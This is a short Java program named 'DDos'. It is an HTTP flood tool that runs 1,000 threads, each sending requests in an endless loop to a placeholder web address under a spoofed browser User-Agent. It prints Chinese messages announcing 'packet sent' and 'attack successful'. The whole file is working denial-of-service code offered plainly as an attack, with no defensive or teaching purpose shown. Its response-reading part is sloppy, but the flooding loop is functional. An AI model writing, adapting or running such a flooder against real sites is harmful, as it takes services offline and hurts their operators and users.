package SOMETH;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DDos {  
    public static void main(String[] args) {  
        ExecutorService es = Executors.newFixedThreadPool(1000);  
        Mythread mythread = new Mythread();  
        Thread thread = new Thread(mythread);  
        for (int i = 0; i < 10000; i++) {  
            es.execute(thread);  
        }  
    }  
}  
  
class Mythread implements Runnable {  
    public void run() {  
        while (true) {  
            try {  
                URL url = new URL("http://www.xxx.com/");  
                URLConnection conn = url.openConnection();  
                conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Linux X; DigExt)");
                System.out.println("发包成功");  
                BufferedInputStream bis = new BufferedInputStream(  
                        conn.getInputStream());  
                byte[] bytes = new byte[1024];  
                int len = -1;  
                StringBuffer sb = new StringBuffer();  
  
                System.out.println(bis.read());
                if (bis != null) {  
                    if ((len = bis.read()) != -1) {  
                        sb.append(new String(bytes, 0, len));  
                        System.out.println("攻击成功！");  
                        bis.close();  
                    }  
                }  
            } catch (MalformedURLException e) {  
                // TODO Auto-generated catch block  
                e.printStackTrace();  
            } catch (IOException e) {  
                // TODO Auto-generated catch block  
                e.printStackTrace();  
            }  
  
        }  
    }  
}  
